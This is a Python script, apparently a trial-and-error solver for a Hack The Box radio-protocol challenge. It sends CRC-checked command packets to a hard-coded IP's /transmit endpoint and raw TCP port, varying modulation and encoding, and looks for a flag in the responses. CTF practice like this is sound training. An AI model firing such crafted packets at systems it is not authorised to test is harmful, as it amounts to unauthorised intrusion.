#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 21: Probar con modulación GFSK
print("[*] INNOVACIÓN 21: Diferentes modulaciones")
for mod in ['ASK', 'FSK', 'GFSK', 'PSK', 'QAM', 'OOK', '2FSK', '4FSK']:
    s = requests.Session()
    s.get(base_url)
    
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': mod, 'bits': '1', 'msg': packet})
    
    time.sleep(2)
    r = s.get(base_url)
    if 'HTB{' in r.text:
        print(f"[SUCCESS with mod={mod}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 22: Enviar payload codificado en ASCII
print("\n[*] INNOVACIÓN 22: Payload en ASCII")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet_bytes = data + struct.pack('<H', crc)
    # Convertir a ASCII
    packet_ascii = ''.join(f'{b:02X}' for b in packet_bytes)
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet_ascii})

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 23: Usar el puerto TCP directamente
print("\n[*] INNOVACIÓN 23: Conectar directamente al puerto TCP")
import socket

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(('94.237.53.81', 59575))
    
    # Enviar paquetes raw
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = data + struct.pack('<H', crc)
        sock.send(packet)
        time.sleep(0.1)
    
    # Esperar respuesta
    time.sleep(2)
    try:
        response = sock.recv(4096)
        print(f"[+] Respuesta TCP: {response}")
        if b'HTB{' in response:
            print("[SUCCESS]", response.decode('latin-1'))
    except:
        pass
    
    sock.close()
except Exception as e:
    print(f"[-] Error TCP: {e}")

# INNOVACIÓN 24: Enviar paquetes en base64
print("\n[*] INNOVACIÓN 24: Payload en base64")
s = requests.Session()
s.get(base_url)

import base64
for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet_bytes = data + struct.pack('<H', crc)
    packet_b64 = base64.b64encode(packet_bytes).decode()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet_b64})

time.sleep(2)
r = s.get(base_url)
if 'HTB{' in r.text:
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")
